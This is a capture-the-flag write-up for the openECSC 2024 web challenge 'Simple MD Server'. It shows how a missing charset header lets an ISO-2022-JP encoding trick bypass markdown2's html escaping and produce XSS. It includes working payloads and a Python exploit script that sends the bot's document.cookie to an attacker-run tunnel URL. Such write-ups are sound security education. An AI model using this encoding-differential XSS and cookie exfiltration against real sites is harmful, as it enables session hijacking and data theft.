# openECSC 2024 - Final Round

## [web] Simple MD Server (13 solves)

Yes, another markdown editor, but this time we keep it simple!

Site: [http://simplemdserver.challs.open.ecsc2024.it:47008](http://simplemdserver.challs.open.ecsc2024.it:47008)

Author: Stefano Alberto <@Xato>

## Overview

The application is a simple markdown editor that allows you to save documents to the server and render them after transforming the markdown to html.

The HTTP server is built using the `http.server` library and is extremely simple.
One characteristic of this server is that it does not set the `Content-Type` header in responses.

## Solution

The challenge requires you to exploit an xss to get the flag from a cookie set in the headless used by the bot, to do this you need to get XSS.

The application makes it possible to create html files generated from our input provided to python's `markdown2` library. 
Among the options passed in generating the html is the ability to escape dangerous html, which should prevent getting XSS by checking markdown.


Since the generated html file is returned from the server without the `Content-Type` header and thus without setting a charset, the browser is forced to perform an auto-detection of the charset of the provided file.
This allows us to exploit the bug described in [this blog post](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/).


We can force the browser to use ISO-2022-JP as the encoding.
This allows us to create an html page that is interpreted with the wrong encoding and thus bypass library protection, resulting in XSS.


To persuade the browser used by the bot (firefox) to detect the `ISO-2022-JP` encoding, it is possible to use the encoding escape characters "ESC" + "(" + "B" multiple times (in my tests it was necessary to enter it about 200 times).

This payload causes the browser to first render the page using `ISO-2022-JP` for a few moments, and then render it again using another encoding.

After that you can use the technique proposed by the blog post to get XSS. 
In particular, this payload, preceded by the series of escape sequences,allows you to run an alert in the victim browser.

`![img%1B$@!](file://a)%1B(B ![red]( onerror=alert() )`

The url used as the image source is from a forbidden scheme (`file://`) so that the image request fails faster and triggers the `onerror` handler before the browser has rendered the page with another encoding.

The final payload used to extract the flag was generated with the following python code.

```python
CHALL_URL + '/preview?x=aaa%1B(Baaaaa' + 'a%1B$@!2%1B(B' * 200 + f'''aaaaa%1B(B ![img%1B$@!](file://a)%1B(B ![red]( onerror=location.assign('{my_server_url}?'%26%2343;document.cookie) )www'''
```


## Exploit


```python
#!/usr/bin/env python3

import logging
import os
import re
import requests
import tunnel

logging.disable()

URL = os.environ.get("URL", "http://simplemdserver.challs.open.ecsc2024.it:47008")
if URL.endswith("/"):
    URL = URL[:-1]

with tunnel.open_http_tunnel() as t:
    hook_url = f"http://{t.remote_host}:{t.remote_port}"

    payload = URL + '/preview?x=aaa%1B(Baaaaa' + 'a%1B$@!2%1B(B' * 200 + f'''aaaaa%1B(B ![img%1B$@!](file://a)%1B(B ![red]( onerror=location.assign('{hook_url}?'%26%2343;document.cookie) )wwwww'''
    r = requests.post(URL + '/report', data=payload.encode())
    print(r.text)

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'')

    assert 'flag' in path

    m = re.search(r'(openECSC|flag)\{.+\}', path)
    print(m.group(0))
```